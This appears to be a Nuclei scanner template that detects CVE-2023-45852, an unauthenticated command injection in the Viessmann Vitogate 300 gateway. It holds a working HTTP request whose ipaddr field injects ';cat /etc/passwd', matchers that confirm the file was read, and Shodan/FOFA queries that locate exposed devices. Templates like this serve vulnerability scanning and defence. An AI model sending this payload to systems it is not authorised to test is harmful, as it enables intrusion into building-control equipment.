http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(header, "application/json")
    - 'contains_all(body, "traceroute: {{randstr}}: Unknown host", "daemon:x:1:1:")'
    type: dsl
  raw:
  - 'POST /cgi-bin/vitogate.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"{{randstr}};cat
    /etc/passwd"}}

    '
id: CVE-2023-45852
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:o:viessmann:vitogate_300_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-45852
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-77
    epss-percentile: 0.93821
    epss-score: 0.08478
  description: 'In Vitogate 300 2.1.3.0, /cgi-bin/vitogate.cgi allows an unauthenticated
    attacker to bypass authentication and execute arbitrary commands via shell metacharacters
    in the ipaddr params JSON data for the put method.

    '
  metadata:
    fofa-query: title="Vitogate 300"
    max-request: 1
    product: vitogate_300_firmware
    shodan-query: title:"Vitogate 300"
    vendor: viessmann
    verified: true
  name: Viessmann Vitogate 300 - Remote Code Execution
  reference:
  - https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html
  - https://github.com/Push3AX/vul/blob/main/viessmann/Vitogate300_RCE.md
  - https://nvd.nist.gov/vuln/detail/CVE-2023-45852
  severity: critical
  tags: cve,cve2023,rce,vitogate,viessmann
